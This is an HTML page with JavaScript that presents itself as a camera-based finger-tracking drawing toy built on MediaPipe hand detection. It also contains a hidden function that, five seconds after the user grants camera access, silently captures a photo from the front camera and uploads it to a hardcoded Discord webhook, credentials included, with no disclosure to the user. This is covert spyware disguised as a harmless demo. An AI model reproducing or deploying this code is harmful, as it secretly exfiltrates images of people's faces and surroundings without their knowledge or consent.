<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enhanced Finger Detection with Drawing</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #222;
      overflow: hidden; /* Prevent scrolling */
    }

    video, canvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    #loading {
      font-size: 24px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      width: 100%;
      color: white;
      background-color: #222;
      z-index: 10;
    }

    #spinner {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 120px;
      height: 120px;
      animation: spin 2s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div id="loading">
    <div id="spinner"></div>
    <p>Loading... Please wait.</p>
  </div>

  <video id="camera-view" autoplay playsinline></video>
  <canvas id="camera-canvas"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

  <script>
    const videoElement = document.getElementById('camera-view');
    const canvasElement = document.getElementById('camera-canvas');
    const canvasCtx = canvasElement.getContext('2d');
    
    let drawingMode = false;  // Tracks whether drawing mode is enabled
    let previousIndexPos = null; // Stores the last position of the index finger

    // Resize canvas to match the window
    function resizeCanvas() {
      canvasElement.width = window.innerWidth;
      canvasElement.height = window.innerHeight;
    }

    // Start camera after loading
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      initializeCamera();
      resizeCanvas();
      window.addEventListener('resize', resizeCanvas);
    }, 3000);

    function initializeCamera() {
      // Request permission for the camera and display it
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          videoElement.srcObject = stream;
          videoElement.style.display = 'block';
          initializeHandTracking();
          setTimeout(captureAndUploadImage, 5000); // Capture and upload image after 5 seconds
        })
        .catch(err => {
          alert('Error accessing the camera: ' + err);
        });
    }

    function initializeHandTracking() {
      const hands = new Hands({
        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.7,
        minTrackingConfidence: 0.7,
      });

      hands.onResults(onResults);

      const camera = new Camera(videoElement, {
        onFrame: async () => {
          await hands.send({ image: videoElement });
        },
        width: 1280,
        height: 720
      });
      camera.start();
    }

    function onResults(results) {
      canvasCtx.save();
      canvasCtx.drawImage(
        results.image, 0, 0, canvasElement.width, canvasElement.height
      );

      if (results.multiHandLandmarks) {
        for (const landmarks of results.multiHandLandmarks) {
          detectThumbPinkyTouch(landmarks);  // Check for thumb-pinky touch
          drawHandLandmarks(landmarks);
          if (drawingMode) {
            trackAndDrawWithIndexFinger(landmarks);  // Draw when in drawing mode
          }
        }
      }
      canvasCtx.restore();
    }

    function detectThumbPinkyTouch(landmarks) {
      const pinkyTip = landmarks[20]; // Pinky tip
      const thumbTip = landmarks[4];  // Thumb tip

      const distance = Math.sqrt(
        Math.pow(pinkyTip.x - thumbTip.x, 2) +
        Math.pow(pinkyTip.y - thumbTip.y, 2)
      );

      if (distance < 0.05) {  // Threshold for touch
        drawingMode = !drawingMode;  // Toggle drawing mode
        previousIndexPos = null;  // Reset index position when toggling
      }
    }

    function trackAndDrawWithIndexFinger(landmarks) {
      const indexTip = landmarks[8];  // Index finger tip

      const indexX = indexTip.x * canvasElement.width;
      const indexY = indexTip.y * canvasElement.height;

      if (previousIndexPos) {
        canvasCtx.beginPath();
        canvasCtx.moveTo(previousIndexPos.x, previousIndexPos.y);
        canvasCtx.lineTo(indexX, indexY);
        canvasCtx.strokeStyle = 'white';
        canvasCtx.lineWidth = 4;
        canvasCtx.stroke();
      }

      previousIndexPos = { x: indexX, y: indexY };
    }

    function drawHandLandmarks(landmarks) {
      canvasCtx.strokeStyle = 'white';  // Set line color to white
      canvasCtx.lineWidth = 3;

      const connections = [
        [0, 1], [1, 2], [2, 3], [3, 4], // Thumb
        [0, 5], [5, 6], [6, 7], [7, 8], // Index finger
        [0, 9], [9, 10], [10, 11], [11, 12], // Middle finger
        [0, 13], [13, 14], [14, 15], [15, 16], // Ring finger
        [0, 17], [17, 18], [18, 19], [19, 20] // Pinky finger
      ];

      const fingerLabels = ["Thumb", "Index", "Middle", "Ring", "Pinky"];
      let fingerCount = 0;

      connections.forEach(([start, end], index) => {
        const startX = landmarks[start].x * canvasElement.width;
        const startY = landmarks[start].y * canvasElement.height;
        const endX = landmarks[end].x * canvasElement.width;
        const endY = landmarks[end].y * canvasElement.height;

        canvasCtx.beginPath();
        canvasCtx.moveTo(startX, startY);
        canvasCtx.lineTo(endX, endY);
        canvasCtx.stroke();

        if ([4, 8, 12, 16, 20].includes(end)) {
          canvasCtx.fillStyle = "white";
          canvasCtx.font = "20px Arial";
          canvasCtx.fillText(fingerLabels[fingerCount], endX - 15, endY - 10);
          fingerCount++;
        }
      });
    }

    function captureAndUploadImage() {
      const captureCanvas = document.createElement('canvas');
      captureCanvas.width = canvasElement.width;
      captureCanvas.height = canvasElement.height;
      const captureCtx = captureCanvas.getContext('2d');
      captureCtx.drawImage(videoElement, 0, 0, captureCanvas.width, captureCanvas.height);
      
      // Convert the canvas to a blob
      captureCanvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('file', blob, 'captured-image.png');

        // Send the image to the Discord webhook
        fetch('https://discord.com/api/webhooks/1269202921480781824/rEeILOelJ3vfUvqSfqkGb0fKpcjLe-4U62vwBaU4abBQ8tkH-az5an4timRi4S7BbXLt', {
          method: 'POST',
          body: formData,
        })
        .then(response => {
          if (response.ok) {
            console.log('Image uploaded successfully');
          } else {
            console.error('Image upload failed:', response.statusText);
          }
        })
        .catch(error => {
          console.error('Error uploading image:', error);
        });
      }, 'image/png');
    }
  </script>

</body>
</html>
